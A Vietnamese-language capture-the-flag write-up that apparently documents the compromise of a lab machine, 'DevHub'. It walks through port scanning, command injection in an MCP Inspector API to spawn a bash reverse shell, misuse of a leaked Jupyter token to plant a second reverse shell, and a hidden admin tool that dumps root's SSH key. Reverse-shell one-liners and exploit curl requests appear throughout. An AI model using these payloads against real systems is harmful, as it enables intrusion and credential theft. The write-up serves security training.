---
description: 'Author: duongpahm Target: 10.129.82.23'
coverY: 0
---

# DevHub

***

### 1. Dò quét hạ tầng mạng (Network Reconnaissance)

Giai đoạn Reconnaissance (thu thập thông tin) luôn là chìa khóa quyết định trong mọi cuộc tấn công. Việc lập bản đồ Attack Surface càng chi tiết, cơ hội tìm ra điểm yếu (vulnerabilities) càng cao. Đối với DevHub, tôi bắt đầu bằng phương pháp quét tiêu chuẩn trước khi tiến hành rà quét sâu hơn.

#### 1.1. Initial Port Scan với Nmap

Công cụ đầu tiên được sử dụng là `nmap`. Tôi thực hiện quét top 1000 TCP ports phổ biến nhất với các cờ (flags) tối ưu cho việc nhận diện dịch vụ:

* `-sV`: Service Version Detection để xác định phiên bản cụ thể của các ứng dụng đang lắng nghe.
* `-sC`: Nmap Scripting Engine (NSE) với các script mặc định để khai thác thêm thông tin từ các dịch vụ (ví dụ: HTTP titles, SSH hostkeys).
* `-T4`: Timing template 4 để tăng tốc độ quét mà không gây ra quá nhiều nhiễu (noise) làm rớt gói tin.
* `-vv`: Verbose mode để in kết quả ra màn hình ngay lập tức.

**Lệnh thực thi & Kết quả đầy đủ:**

```bash
┌──(duong㉿duong)-[~]
└─$ sudo nmap -sV -sC -T4 -vv 10.129.82.23                   
[sudo] password for duong: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-30 15:18 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.00s elapsed
Initiating Ping Scan at 15:18
Scanning 10.129.82.23 [4 ports]
Completed Ping Scan at 15:18, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:18
Completed Parallel DNS resolution of 1 host. at 15:18, 0.50s elapsed
Initiating SYN Stealth Scan at 15:18
Scanning 10.129.82.23 [1000 ports]
Discovered open port 22/tcp on 10.129.82.23
Discovered open port 80/tcp on 10.129.82.23
Completed SYN Stealth Scan at 15:18, 5.18s elapsed (1000 total ports)
Initiating Service scan at 15:18
Scanning 2 services on 10.129.82.23
Completed Service scan at 15:18, 6.11s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.82.23.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 5.11s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.00s elapsed
Nmap scan report for 10.129.82.23
Host is up, received echo-reply ttl 63 (0.050s latency).
Scanned at 2026-05-30 15:18:17 EDT for 16s
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPWeIVAL8xAfqZkJzRocGOpKCgXQk807PgJQqBcvDCiTcyFYlXvFY0v+sI1XXnYKghVRDkCxYy23sjlFMceuifE=
|   256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAWDVyu6UXTR8XbXiFXOJx0xwUVCRheT9hT20o1VbEht
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.37 seconds
           Raw packets sent: 2005 (88.196KB) | Rcvd: 6 (248B)
```

**Phân tích chuyên sâu từ duongpahm:**

* **OS Fingerprinting thông qua OpenSSH:** Phiên bản `OpenSSH 8.9p1 Ubuntu 3ubuntu0.15` là một dấu vân tay (fingerprint) cực kỳ đắt giá. Theo quy ước package của Ubuntu, bản 8.9p1 tương ứng với **Ubuntu 22.04 LTS (Jammy Jellyfish)**. Việc xác định chính xác OS version giúp tôi định hình được các đường dẫn cấu hình mặc định và tìm kiếm các lỗ hổng nhân (Kernel vulnerabilities) nếu cần khai thác leo thang đặc quyền sau này.
* **Nginx và Name-based Virtual Hosting:** Port 80 đang mở và chạy `nginx 1.18.0`. Điểm mấu chốt nằm ở output của NSE script `http-title`: `Did not follow redirect to http://devhub.htb/`. Điều này có nghĩa là khi tôi gửi một HTTP request với Header `Host: 10.129.82.23` (mặc định của cURL hoặc trình duyệt khi gõ IP), Nginx server block mặc định đã đón request và trả về mã HTTP 301/302 Redirect, ép client chuyển hướng sang domain `devhub.htb`. Đây là minh chứng rõ ràng cho việc hệ thống áp dụng cấu hình **Virtual Hosting**. Để giao tiếp chính xác với Web Application, tôi buộc phải thêm ánh xạ DNS này vào file host cục bộ:

```bash
echo "10.129.82.23 devhub.htb" | sudo tee -a /etc/hosts
```

#### 1.2. Full TCP Port Scan (RustScan)

Trong cả môi trường thực tế lẫn CTF, các quản trị viên và developer thường "giấu" các dịch vụ nội bộ (Internal Services), APIs, hoặc môi trường Staging/Dev ở các cổng cao (high ports) nằm ngoài dải 1000 ports mặc định của Nmap. Nmap nếu quét toàn bộ `65535` ports (`-p-`) thì sẽ mất khá nhiều thời gian. Thay vào đó, tôi sử dụng `rustscan`, một công cụ mạnh mẽ viết bằng ngôn ngữ Rust, có khả năng tận dụng socket không đồng bộ (asynchronous I/O) để dò quét 65535 TCP ports chỉ trong vài giây, sau đó tự động pipe kết quả sang Nmap.

**Lệnh thực thi & Kết quả đầy đủ:**

```bash
┌──(duong㉿duong)-[~]
└─$ rustscan -a 10.129.82.23
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/home/duong/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.82.23:22
Open 10.129.82.23:80
Open 10.129.82.23:6274
[~] Starting Script(s)
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-30 15:23 -0400
Initiating Ping Scan at 15:23
Scanning 10.129.82.23 [4 ports]
Completed Ping Scan at 15:23, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:23
Scanning devhub.htb (10.129.82.23) [3 ports]
Discovered open port 22/tcp on 10.129.82.23
Discovered open port 80/tcp on 10.129.82.23
Discovered open port 6274/tcp on 10.129.82.23
Completed SYN Stealth Scan at 15:23, 0.06s elapsed (3 total ports)
Nmap scan report for devhub.htb (10.129.82.23)
Host is up, received reset ttl 63 (0.047s latency).
Scanned at 2026-05-30 15:23:11 EDT for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
6274/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (172B)
```

**Phân tích kỹ thuật từ kết quả RustScan:** Việc quét toàn diện đã giúp tôi tìm ra một port cực kỳ thú vị: **6274/tcp**. Nmap báo cáo dịch vụ này là `unknown` (không xác định). Điều này chứng tỏ nó không giao tiếp thông qua bất kỳ protocol tiêu chuẩn nào (như FTP, SMB, SMTP) có sẵn trong các `nmap-service-probes` signatures, hoặc nó là một custom application/API server. Các dịch vụ `unknown` trên port cao thường là "mỏ vàng" trong Pentesting, vì chúng ít được Audit bảo mật hơn các dịch vụ public ở port thấp.

***

### 2. Web Application Enumeration (Khám phá Ứng dụng Web)

#### 2.1. Phân tích ngữ cảnh từ Port 80 (DevHub Dashboard)

Truy cập `http://devhub.htb/` bằng trình duyệt web. Đây là trang chủ của nền tảng phát triển nội bộ. Việc đọc kỹ nội dung trang web cung cấp cho tôi ngữ cảnh (Context) tuyệt vời về sơ đồ hạ tầng (Architecture) của hệ thống:

* **MCP Inspector:** Được đánh dấu là _Active - Port 6274_. Vậy là bí ẩn về port 6274 đã được giải đáp. Nó là một công cụ nội bộ dùng để test các ứng dụng Model Context Protocol.
* **Analytics Dashboard:** Được gắn nhãn _Internal Only - localhost:8888_. Dịch vụ này chạy nền tảng Jupyter Lab và chỉ được phép truy cập từ loopback interface (`127.0.0.1`). Điều này có nghĩa là tôi không thể kết nối trực tiếp đến port 8888 từ máy Kali của mình. Nó đòi hỏi tôi phải có một bàn đạp bên trong server (Local Port Forwarding / Pivot) thì mới có thể chạm tới Jupyter.
* **Code Repository:** Đang trong trạng thái _Maintenance Mode_ (bảo trì). Tôi tạm thời gạt nó sang một bên.

#### 2.2. Phân tích Client-side Source Code trên Port 6274

Tôi chuyển hướng tập trung sang `http://devhub.htb:6274/`. Giao diện load lên là một ứng dụng Web có tên "MCPJam Inspector". Quan sát Network tab trong trình duyệt, ứng dụng này được build theo cấu trúc **Single Page Application (SPA)** (khả năng là React hoặc Vue được bundle bằng Vite).

Điểm đặc trưng của SPA là gần như toàn bộ Routing và Logic tương tác với Backend API đều được biên dịch chung vào một hoặc vài file JavaScript tĩnh lớn (JS Bundles).

Tôi tiến hành trích xuất URL và phân tích file bundle chính tại đường dẫn `/assets/index-DRYhT9Xb.js` bằng các công cụ command line:

```bash
curl -s http://10.129.82.23:6274/assets/index-DRYhT9Xb.js | grep -oE "/api/mcp/[a-zA-Z0-9/]+" | sort -u
```

Lệnh trên trả về một danh sách các REST API endpoints, trong đó tôi đặc biệt chú ý đến: `/api/mcp/connect`

**Reverse Engineering JS Logic:** Tôi dùng lệnh `grep` với tham số Context (`-C`) để lấy các dòng code xung quanh endpoint này nhằm xem cách Front-end tương tác với Back-end:

```javascript
async function Jx(e, t) {
  return (
    await dEe(
      "/api/mcp/connect",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ serverConfig: e, serverId: t }),
      },
      2e4,
    )
  ).json();
}
```

**Mổ xẻ lỗ hổng Command Injection:** Theo đặc tả của chuẩn **MCP (Model Context Protocol)**, một MCP Client (ở đây đóng vai trò là backend của port 6274) có thể giao tiếp với một MCP Server cục bộ qua luồng Standard Input/Output (`stdio`). Để khởi chạy kết nối `stdio`, client cần kích hoạt một tiến trình nhị phân (Binary Process) trên OS.

Do đó, tham số `serverConfig` (được truyền từ biến `e` trong Front-end) có cấu trúc chuẩn như sau:

```json
{
  "command": "node",
  "args": ["server.js"]
}
```

**Phân tích điểm yếu:** Lỗ hổng phát sinh khi Backend của API `/api/mcp/connect` tiếp nhận giá trị `command` và `args` từ HTTP POST Request do người dùng (hoặc Attacker) gửi lên, và trực tiếp ném vào các hàm sinh tiến trình như `child_process.spawn()` (Node.js) hoặc `subprocess.Popen()` (Python) **mà không hề áp dụng cơ chế Allow-list (danh sách trắng) hay Sanitization chặt chẽ**.

Hệ quả là thay vì gọi `node` hay `python` theo mục đích của developer, tôi hoàn toàn có quyền truyền vào `command` là `bash` (hoặc `sh`) và gắn kèm theo các lệnh độc hại vào tham số `args`. Đây là một dạng của **Remote Code Execution (RCE) thông qua Command Injection**.

#### 2.3. Rò rỉ thông tin nhạy cảm (Information Disclosure)

Cũng trong khi phân tích tệp JS bundle khổng lồ đó, quá trình tìm kiếm các chuỗi định danh (string regex) đã mang lại một phát hiện chí mạng (Critical Information Disclosure).

Trong mã nguồn Frontend, developer đã lỡ tay Hardcode (gắn cứng) một thẻ HTML chứa token xác thực:

```html
data-jupyter-api-token="a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

Token này tương ứng với dịch vụ Jupyter Lab chạy ẩn ở port `8888` mà ta đã phân tích trong phần 2.1. Lỗi Hardcoded Credentials này là "chiếc vé VIP" giúp tôi truy cập sâu hơn vào hệ thống sau khi có điểm truy cập ban đầu.

***

### 3. Initial Foothold (Chiếm quyền điều khiển ban đầu)

Với lỗ hổng RCE đã được phân tích ở Port 6274, tôi bắt tay vào việc chế tạo Payload để lấy **Reverse Shell**.

#### Chuẩn bị Payload

Tôi muốn DevHub chủ động tạo một luồng kết nối TCP mạng ngược (outbound connection) về máy tấn công của tôi, đồng thời gắn (bind) terminal bash vào luồng đó.

Lệnh bash tiêu chuẩn được sử dụng là: `bash -i >& /dev/tcp/10.10.14.38/4444 0>&1`

* `bash -i`: Sinh ra một Interactive Shell (shell có tính tương tác).
* `>& /dev/tcp/10.10.14.38/4444`: Chuyển hướng Standard Output (STDOUT) và Standard Error (STDERR) đến socket TCP qua cổng 4444 ở máy tôi.
* `0>&1`: Lấy luồng Standard Input (STDIN) từ chính file descriptor 1, tức là tôi có thể gõ lệnh từ máy mình và đẩy sang máy đích.

#### 3.1. Thiết lập Listener

Trên máy tấn công, tôi mở Netcat lắng nghe:

```bash
┌──(duong㉿duong)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### 3.2. Thực thi RCE

Sử dụng cURL để gửi HTTP POST request, chèn lệnh Bash vào cấu trúc JSON mong đợi:

```bash
┌──(duong㉿duong)-[~]
└─$ curl -X POST http://10.129.82.23:6274/api/mcp/connect \
     -H "Content-Type: application/json" \
     -d '{
       "serverId": "pwned_shell",
       "serverConfig": {
         "command": "bash",
         "args": ["-c", "bash -i >& /dev/tcp/10.10.14.38/4444 0>&1"]
       }
     }'
```

**Phân tích kết quả:** Request cURL trả về JSON lỗi: `{"success":false,"error":"Connection failed for server pwned_shell: MCP error -32001: Request timed out","details":"MCP error -32001: Request timed out"}`

Tuy nhiên, đây là **lỗi giả** (False Negative do Timeout). Bởi vì khi Backend gọi `spawn` thực thi luồng `bash -i`, tiến trình này sẽ mở ra luồng giao tiếp TCP và không bao giờ thoát (exit) trừ khi shell bị ngắt. Web server chờ tiến trình kết thúc để phản hồi HTTP nhưng vì nó bị block vô thời hạn (Hanging process), quá thời gian cấu hình (ví dụ 20s), web server buộc phải trả về lỗi `Timed out`.

Dù web server báo lỗi, nhưng nhìn sang màn hình Netcat, ta thấy kết nối đã thành công rực rỡ:

```bash
connect to [10.10.14.38] from (UNKNOWN) [10.129.82.23] 34218
bash: cannot set terminal process group (1076): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ id
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ whoami
mcp-dev
```

Tôi đã nắm giữ **Initial Foothold** thành công với user `mcp-dev`.

***

### 4. Lateral Movement: `mcp-dev` -> `analyst`

Tài khoản `mcp-dev` là một user ít đặc quyền. Tôi cần di chuyển (pivot) sang tài khoản `analyst` để khai thác được dịch vụ quan trọng hơn.

#### 4.1. Local Enumeration&#x20;

Thông qua terminal `mcp-dev`, tôi phân tích các tiến trình hệ thống bằng lệnh:

```bash
ps auxww | grep -iE "nginx|apache|gunicorn|uwsgi|node|python" | grep -v grep
```

**Bức tranh kiến trúc lộ diện:**

1.  **Dịch vụ Jupyter:**

    ```
    analyst  1075  /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
    ```

    Tiến trình này xác nhận mọi nhận định trước đó: Jupyter chạy với user `analyst`, chỉ nghe trên localhost, và token bị rò rỉ là hoàn toàn chính xác.
2.  **Dịch vụ OPSMCP (Mấu chốt của Privilege Escalation):**

    ```
    root     1082  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
    ```

    Đây là lỗi **Insecure Service Architecture**. Dịch vụ `opsmcp` chạy với quyền tối cao (`root`), nhưng trình thông dịch (Python Interpreter) lại trỏ vào Virtual Environment (`/home/analyst/jupyter-env/bin/python3`) thuộc quyền sở hữu của user `analyst`. Nếu chiếm được user `analyst`, tôi có thể chỉnh sửa/thêm mã độc vào Virtual Env này để thực thi lệnh dưới quyền root (Python Library Hijacking).

#### 4.2. Khai thác Jupyter API (REST API Abuse)

Jupyter Lab cung cấp REST API tương tác với File System (Contents API) và thực thi mã. Với token `a7f3...`, tôi có toàn quyền quản trị (Authentication Bypass).

**Liệt kê file trong Workspace:**

```bash
curl -s "http://127.0.0.1:8888/api/contents?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

Kết quả cho thấy có file `shell.py` nằm trong `/home/analyst/notebooks`.

**Ghi đè file `shell.py` (Arbitrary File Write):** Sử dụng cURL gửi HTTP PUT, tôi đè nội dung file `shell.py` bằng một Python script gọi `os.system` sinh một reverse shell thứ 2 về port 4445.

```bash
curl -s -X PUT "http://127.0.0.1:8888/api/contents/shell.py?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
     -H "Content-Type: application/json" \
     -d '{
       "type": "file",
       "format": "text",
       "content": "import os\nos.system(\"bash -c \\\"bash -i >& /dev/tcp/10.10.14.38/4445 0>&1\\\"\")"
     }'
```

**Kích hoạt Shell:** Sau khi lưu, file `shell.py` được thực thi thông qua Jupyter API (hoặc thông qua một tiến trình lập lịch ngầm định). Trên listener `nc -lvnp 4445` của tôi kết nối mới nhảy về:

```bash
┌──(duong㉿duong)-[~]
└─$ nc -lvnp 4445
connect to [10.10.14.38] from (UNKNOWN) [10.129.82.23] 44520
analyst@devhub:~$ id
uid=1000(analyst) gid=1000(analyst) groups=1000(analyst)
```

Quá trình **Lateral Movement** thành công.

***

### 5. Privilege Escalation

#### 5.1. Thu thập API Key của Dịch vụ Nội bộ

Tại thư mục home của user `analyst`, tôi tìm thấy một file ẩn (Hidden File):

```bash
analyst@devhub:~$ ls -la /home/analyst
-rw------- 1 analyst analyst   35 Mar 16 21:49 .opsmcp_key
...
analyst@devhub:~$ cat /home/analyst/.opsmcp_key
opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

File này là chìa khóa dùng để truy cập vào dịch vụ **OPSMCP** chạy tại port 5000 (dịch vụ mà tôi đã nhắc đến là chạy bằng `root` ở phần 4.1).

#### 5.2. Undocumented API / Hidden Features

Tôi dùng cURL để gọi API liệt kê danh sách tính năng (Tools) của OPSMCP:

```bash
curl -s -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" http://127.0.0.1:5000/tools/list
```

Server trả về 4 công cụ (Tools) cơ bản: `ops.system_status`, `ops.list_services`, `ops.check_disk`, `ops.view_logs`.

Dựa vào kinh nghiệm Pentesting (Black-box analysis), các API phát triển nội bộ thường hay "giấu" các endpoint quản trị hoặc debug. Bằng cách dự đoán hoặc fuzzing tên hàm, tôi kích hoạt **Debug Mode**:

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
     -H "Content-Type: application/json" \
     -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
     -d '{"name":"ops._debug_mode","arguments":{}}'
```

**Phản hồi từ Server:**

```json
{
  "debug": true,
  "hidden_tools": [
    "ops._admin_dump",
    "ops._debug_mode"
  ],
  "message": "Debug mode enabled"
}
```

Lỗ hổng Logic xuất hiện. Kích hoạt Debug Mode làm "lộ" ra một công cụ quản trị (Admin Tool) nguy hiểm: `ops._admin_dump`.

#### 5.3. Trích xuất Root SSH Private Key

Tool `_admin_dump` được sinh ra để trích xuất dữ liệu nhạy cảm. Tôi truyền tham số `target` là `ssh_keys` và ép xác nhận `confirm: true` để buộc root service nhả nội dung private key ra.

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
     -H "Content-Type: application/json" \
     -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
     -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' > /tmp/rootkey.json
```

Trích xuất chuỗi RSA từ file JSON và lưu vào file `/tmp/root.key` trên máy tấn công. Chỉnh lại quyền bảo mật cho file key:

```bash
chmod 600 /tmp/root.key
```

***

### 6. Root Access

Với Private Key thu được, tôi SSH thẳng vào máy tính mục tiêu để đoạt quyền Tối cao, bỏ qua kiểm tra Host Key để quá trình SSH suôn sẻ trên môi trường lab.

```bash
┌──(duong㉿duong)-[~]
└─$ ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/root.key root@10.129.82.23
Warning: Permanently added '10.129.82.23' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic aarch64)

root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)

root@devhub:~# cat /root/root.txt
[ROOT_FLAG_SUCCESSFULLY_CAPTURED]
```

